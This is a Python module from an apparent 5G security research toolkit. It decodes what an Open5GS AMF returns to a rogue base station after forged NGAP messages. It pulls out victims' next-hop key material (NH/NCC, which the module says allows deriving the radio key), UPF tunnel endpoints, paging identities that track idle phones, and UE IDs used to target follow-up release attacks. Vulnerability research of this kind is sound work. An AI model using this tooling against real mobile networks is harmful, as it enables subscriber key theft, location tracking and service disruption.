"""Extract the security-relevant material an Open5GS AMF leaks back to a rogue
gNB in response to the confirmed cross-gNB attacks.

The headline finding (source-verified, Open5GS 2.8.0 ngap-build.c:2431-2473): a
forged PATH SWITCH REQUEST makes the AMF return, in the PATH SWITCH REQUEST
ACKNOWLEDGE, the victim's fresh {NH, NCC} next-hop key material (SecurityContext
IE, id 93) and the UPF N3 GTP-U TEID/address (PDUSessionResourceSwitchedList,
id 77). NH + NCC let the holder derive KgNB* (TS 33.501 §6.9.2.1.1), i.e. the AS
key governing the victim's connection — disclosure, not merely DoS.
"""
from __future__ import annotations

import socket

from . import ngap

# NGAP protocol-IE ids we read out of the acknowledge (TS 38.413).
IE_AMF_UE_NGAP_ID = 10
IE_RAN_UE_NGAP_ID = 85
IE_UE_NGAP_IDS = 114  # UE-NGAP-IDs (pair) — used by UEContextReleaseCommand
IE_PDU_SWITCHED_LIST = 77
IE_SECURITY_CONTEXT = 93


def _bits_to_bytes(bitstr) -> bytes:
    """pycrate BIT STRING -> bytes. Value is (int, bit_length)."""
    val, nbits = bitstr
    return int(val).to_bytes((nbits + 7) // 8, "big")


def _fmt_addr(bitstr) -> str:
    b = _bits_to_bytes(bitstr)
    if len(b) == 4:
        return socket.inet_ntoa(b)
    if len(b) == 16:
        return socket.inet_ntop(socket.AF_INET6, b)
    return b.hex()


def _unwrap(ie):
    """protocolIE values are open types stored as (typename, value)."""
    if isinstance(ie, tuple) and len(ie) == 2 and isinstance(ie[0], str):
        return ie[1]
    return ie


def _gtp_from_tnl(tnl):
    """(choice, {..}) UPTransportLayerInformation -> (ip, teid_hex)."""
    kind, body = tnl
    if kind != "gTPTunnel":
        return None
    return _fmt_addr(body["transportLayerAddress"]), body["gTP-TEID"].hex()


def _decode_ack_transfer(raw):
    """The per-session pathSwitchRequestAcknowledgeTransfer is an OCTET STRING
    with a contained type; pycrate may hand us bytes or an already-decoded value.
    Returns (decoded_dict_or_None, raw_hex). raw_hex is always the on-the-wire
    octets when we can recover them (re-encoding the value if pycrate pre-decoded
    it), so the evidence record keeps the exact bytes even for an empty transfer.
    """
    if isinstance(raw, (bytes, bytearray)):
        try:
            return ngap.decode_transfer("PathSwitchRequestAcknowledgeTransfer", raw), bytes(raw).hex()
        except Exception:
            return None, bytes(raw).hex()
    # pycrate handed us the already-decoded (typename, value) or a bare value.
    val = raw[1] if (isinstance(raw, tuple) and len(raw) == 2
                     and isinstance(raw[0], str)) else raw
    if isinstance(val, dict):
        try:
            hexs = ngap.encode_transfer("PathSwitchRequestAcknowledgeTransfer", val).hex()
        except Exception:
            hexs = None
        return val, hexs
    if isinstance(raw, tuple):
        try:
            return ngap.decode_transfer("PathSwitchRequestAcknowledgeTransfer", raw[0]), bytes(raw[0]).hex()
        except Exception:
            return None, None
    return None, None


def path_switch_ack_leak(pdu_val) -> dict:
    """Given a decoded NGAP PDU that is a PathSwitchRequestAcknowledge, pull out
    the leaked key material and UPF N3 endpoints. Returns {} if it is not an ACK.
    """
    if ngap.message_type(pdu_val) != "PathSwitchRequestAcknowledge":
        return {}
    ies = {k: _unwrap(v) for k, v in ngap.get_ies(pdu_val).items()}
    out: dict = {
        "message": "PathSwitchRequestAcknowledge",
        "amf_ue_ngap_id": ies.get(IE_AMF_UE_NGAP_ID),
        "ran_ue_ngap_id": ies.get(IE_RAN_UE_NGAP_ID),
        "nh": None, "ncc": None, "sessions": [],
    }
    sec = ies.get(IE_SECURITY_CONTEXT)
    if sec:
        out["ncc"] = sec.get("nextHopChainingCount")
        out["nh"] = _bits_to_bytes(sec["nextHopNH"]).hex()
    for item in ies.get(IE_PDU_SWITCHED_LIST, []) or []:
        dec, raw_hex = _decode_ack_transfer(item["pathSwitchRequestAcknowledgeTransfer"])
        tnl = dec.get("uL-NGU-UP-TNLInformation") if isinstance(dec, dict) else None
        gtp = _gtp_from_tnl(tnl) if tnl else None
        if gtp:
            note = "UPF N3 UL endpoint disclosed in ACK transfer"
        elif isinstance(dec, dict):
            # Open5GS 2.8.0 legitimately returns an empty transfer here: the UL
            # TNL is omitted, so the N3 endpoint is NOT disclosed by the ACK. The
            # UPF N3 address is instead observed at the gtpu-sink once downlink is
            # redirected. This is the honest limit, not a decode failure.
            note = "empty/no-UL-TNL transfer - N3 endpoint not disclosed by this build's ACK"
        else:
            note = "transfer not decodable"
        out["sessions"].append({
            "pdu_session_id": item["pDUSessionID"],
            "upf_n3_ip": gtp[0] if gtp else None,
            "upf_n3_teid": gtp[1] if gtp else None,
            "ack_transfer_hex": raw_hex,
            "note": note,
        })
    return out


# ---------------------------------------------------------------- Paging (g02/g03)
IE_UE_PAGING_IDENTITY = 115
IE_TAI_LIST_FOR_PAGING = 103


def paging_info(pdu_val) -> dict:
    """Extract the victim identity from a PAGING the AMF fanned out to our rogue
    gNB after we claimed its TAI (RAN Config Update / NG Setup false-TAI). Returns
    {} if the PDU is not a Paging. The 5G-S-TMSI uniquely tracks the idle UE."""
    if ngap.message_type(pdu_val) != "Paging":
        return {}
    ies = {k: _unwrap(v) for k, v in ngap.get_ies(pdu_val).items()}
    out: dict = {"message": "Paging", "fiveg_s_tmsi": None, "tais": []}
    upi = ies.get(IE_UE_PAGING_IDENTITY)  # already once-unwrapped: ("fiveG-S-TMSI", {..})
    if isinstance(upi, tuple) and upi[0] == "fiveG-S-TMSI":
        st = upi[1]
        amf_set = _bits_to_bytes(st["aMFSetID"]).hex()
        amf_ptr = _bits_to_bytes(st["aMFPointer"]).hex()
        tmsi = st["fiveG-TMSI"].hex() if isinstance(st["fiveG-TMSI"], (bytes, bytearray)) \
            else str(st["fiveG-TMSI"])
        out["fiveg_s_tmsi"] = f"{amf_set}:{amf_ptr}:{tmsi}"
        out["fiveg_tmsi"] = tmsi
    for item in ies.get(IE_TAI_LIST_FOR_PAGING, []) or []:
        tai = item.get("tAI", {})
        tac = tai.get("tAC")
        out["tais"].append(tac.hex() if isinstance(tac, (bytes, bytearray)) else tac)
    return out


# Common 5GMM cause values (TS 24.501 Table 9.11.3.2.1) seen in rejects.
_GMM_CAUSE = {
    0x03: "Illegal UE",
    0x06: "Illegal ME",
    0x07: "5GS services not allowed",
    0x09: "UE identity cannot be derived by the network",
    0x0A: "Implicitly deregistered",
    0x0B: "PLMN not allowed",
    0x0F: "No suitable cells in tracking area",
    0x1B: "N1 mode not allowed",
    0x5F: "Semantically incorrect message",
    0x60: "Invalid mandatory information",
    0x61: "Message type non-existent or not implemented",
    0x62: "Message type not compatible with the protocol state",
    0x63: "Information element non-existent or not implemented",
    0x64: "Conditional IE error",
    0x65: "Message not compatible with the protocol state",
    0x67: "Protocol error, unspecified",
}


def nas_reject_info(nas_pdu) -> dict:
    """Best-effort parse of plain 5GMM Service/Registration Reject in a NAS-PDU.

    Returns {} if not a recognizable plain reject. Used after InitialUE to show
    whether the AMF answered with a 5GMM cause (and which one).
    """
    if not isinstance(nas_pdu, (bytes, bytearray)) or len(nas_pdu) < 4:
        return {}
    b = bytes(nas_pdu)
    # plain: EPD=7E, sec-hdr=0, msg-type, cause
    if b[0] != 0x7E:
        return {}
    # security-protected: skip MAC/SQN and look at inner plain header
    if (b[1] & 0x0F) != 0 and len(b) >= 8:
        inner = b[7:]  # after EPD, sec-hdr, MAC(4), SQN(1) — approx
        if inner and inner[0] == 0x7E:
            b = inner
    if len(b) < 4 or b[0] != 0x7E or (b[1] & 0x0F) != 0:
        return {}
    msg_type = b[2]
    cause = b[3]
    names = {
        0x4D: "ServiceReject",
        0x44: "RegistrationReject",
        0x41: "AuthenticationReject",
        0x47: "DeregistrationRequest_UE_terminated",
    }
    if msg_type not in names:
        return {"message": f"plain_nas_type_0x{msg_type:02x}", "raw_hex": b.hex()}
    return {
        "message": names[msg_type],
        "gmm_cause": cause,
        "gmm_cause_name": _GMM_CAUSE.get(cause, f"cause_0x{cause:02x}"),
        "raw_hex": b.hex(),
    }


def downlink_nas_info(pdu_val) -> dict:
    """IDs + embedded NAS reject summary from DownlinkNASTransport."""
    if ngap.message_type(pdu_val) != "DownlinkNASTransport":
        return {}
    out = ue_ngap_ids(pdu_val)
    try:
        ies = {k: _unwrap(v) for k, v in ngap.get_ies(pdu_val).items()}
    except Exception:
        return out
    nas = ies.get(38)  # NAS-PDU
    if isinstance(nas, tuple) and len(nas) == 2:
        nas = nas[1]
    if isinstance(nas, (bytes, bytearray)):
        rej = nas_reject_info(nas)
        if rej:
            out["nas"] = rej
        else:
            out["nas_hex"] = bytes(nas).hex()
    return out


def ue_ngap_ids(pdu_val) -> dict:
    """Pull AMF/RAN-UE-NGAP-IDs from any UE-associated NGAP PDU (DL NAS, ICS,
    Release Command, Error Indication, …). Returns {} if neither IE is present.

    Used by chain-initue-release: after a forged InitialUEMessage the AMF may
    allocate a *new* AmfUeNgapId and push DownlinkNASTransport /
    InitialContextSetupRequest / UEContextReleaseCommand on the attacker TNLA;
    those IEs tell us which AU the follow-up Release should target.

    UEContextReleaseCommand often carries IE 114 (UE-NGAP-IDs) as a pair instead
    of bare IEs 10/85 — unwrap that shape too.
    """
    try:
        ies = {k: _unwrap(v) for k, v in ngap.get_ies(pdu_val).items()}
    except Exception:
        return {}
    amf = ies.get(IE_AMF_UE_NGAP_ID)
    ran = ies.get(IE_RAN_UE_NGAP_ID)
    pair = ies.get(IE_UE_NGAP_IDS)
    if pair is not None and (amf is None or ran is None):
        # shapes: ("uE-NGAP-ID-pair", {...}) or already-unwrapped dict
        body = pair[1] if (isinstance(pair, tuple) and len(pair) == 2) else pair
        if isinstance(body, dict):
            if amf is None:
                amf = body.get("aMF-UE-NGAP-ID")
            if ran is None:
                ran = body.get("rAN-UE-NGAP-ID")
    if amf is None and ran is None:
        return {}
    return {
        "message": ngap.message_type(pdu_val),
        "amf_ue_ngap_id": amf,
        "ran_ue_ngap_id": ran,
    }


# ---------------------------------------------------------------- Handover Request (HO-window)
def handover_request_ids(pdu_val) -> dict:
    """Pull AMF/RAN-UE-NGAP-IDs out of a HandoverRequest the AMF pushed to us
    after a forged HandoverRequired named this FakeGNB as TargetID. Those IDs
    identify the *target* RanUe mid-handover (distinct from the source/victim
    AMF-UE-NGAP-ID) and are what p09 HandoverNotify must carry."""
    if ngap.message_type(pdu_val) != "HandoverRequest":
        return {}
    ies = {k: _unwrap(v) for k, v in ngap.get_ies(pdu_val).items()}
    return {
        "message": "HandoverRequest",
        "amf_ue_ngap_id": ies.get(IE_AMF_UE_NGAP_ID),
        "ran_ue_ngap_id": ies.get(IE_RAN_UE_NGAP_ID),
    }


def summarize_leak(leak: dict) -> str:
    if not leak:
        return "(no leak — not a PathSwitchRequestAcknowledge)"
    lines = [f"AMF-UE-NGAP-ID={leak['amf_ue_ngap_id']} "
             f"RAN-UE-NGAP-ID={leak['ran_ue_ngap_id']}"]
    if leak.get("nh") is not None:
        lines.append(f"  LEAKED KEY MATERIAL:  NCC={leak['ncc']}  NH={leak['nh']}")
        lines.append("    -> attacker can derive KgNB* = KDF(NH, PCI, ARFCN-DL)  "
                     "[TS 33.501 6.9.2.1.1]")
    for s in leak.get("sessions", []):
        if s.get("upf_n3_ip"):
            lines.append(f"  LEAKED UPF N3 ENDPOINT (PDU {s['pdu_session_id']}): "
                         f"{s['upf_n3_ip']}  TEID={s['upf_n3_teid']}")
        else:
            lines.append(f"  PDU {s['pdu_session_id']} ack-transfer (no UL-TNL in this "
                         f"SMF build) raw={s.get('ack_transfer_hex')}")
    return "\n".join(lines)
